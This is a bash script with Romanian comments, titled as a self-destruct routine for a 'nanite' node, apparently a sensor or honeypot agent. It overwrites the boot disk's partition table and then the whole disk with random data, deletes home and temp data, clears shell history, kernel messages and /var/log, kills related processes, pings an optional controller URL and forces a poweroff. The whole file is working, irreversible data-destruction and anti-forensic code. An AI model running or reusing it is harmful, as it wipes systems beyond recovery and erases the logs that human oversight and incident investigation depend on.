#!/bin/bash
# NANITE SELF-DESTRUCT: Seppuku v2
# VITEZA E CRITICA. Cel mai rau INTAI.
# Secunda 1: disk unbootable. Secunda 2: date sterse. Restul e bonus.

BOOT_DEV=$(findmnt -n -o SOURCE / 2>/dev/null | sed 's/[0-9]*$//' | sed 's/p[0-9]*$//')

# ═══ SECUNDA 1: Distruge partition table + boot sector ═══
if [ -b "$BOOT_DEV" ]; then
    dd if=/dev/urandom of="$BOOT_DEV" bs=1M count=1 status=none 2>/dev/null &
    dd if=/dev/urandom of="$BOOT_DEV" bs=1M count=1 seek=$(blockdev --getsize64 "$BOOT_DEV" 2>/dev/null | awk '{print int($1/1048576)-1}') status=none 2>/dev/null &
fi

# ═══ SECUNDA 2: Sterge date colectate ═══
rm -rf /tmp/nanite-* /tmp/scan-* /tmp/*.json /tmp/*.log 2>/dev/null &
rm -rf /home/argos/* /home/argos/.* 2>/dev/null &
history -c 2>/dev/null
dmesg -C 2>/dev/null

# ═══ SECUNDA 3: Kill tot ═══
pkill -9 -f nanite 2>/dev/null &
pkill -9 -f honeypot 2>/dev/null &
pkill -9 -f python3 2>/dev/null &
pkill -9 -f watcher 2>/dev/null &

# ═══ BACKGROUND: Full disk wipe ═══
if [ -b "$BOOT_DEV" ]; then
    dd if=/dev/urandom of="$BOOT_DEV" bs=4M status=none 2>/dev/null &
fi

# ═══ IN PARALEL: Notifica mama (best effort) ═══
ARGOS_URL="${ARGOS_URL:-}"
NODE_ID="${NANITE_NODE_ID:-unknown}"
if [ -n "$ARGOS_URL" ]; then
    curl -sf -X POST "$ARGOS_URL/api/nanite/heartbeat" \
        -H "Content-Type: application/json" \
        -d "{\"node_id\":\"$NODE_ID\",\"status\":\"SPK\"}" \
        --connect-timeout 1 --max-time 2 2>/dev/null &
fi

# ═══ Clear RAM ═══
echo 3 > /proc/sys/vm/drop_caches 2>/dev/null
rm -rf /var/log/* 2>/dev/null

# ═══ Poweroff dupa 30s max ═══
sleep 30
sync 2>/dev/null
echo o > /proc/sysrq-trigger 2>/dev/null || poweroff -f
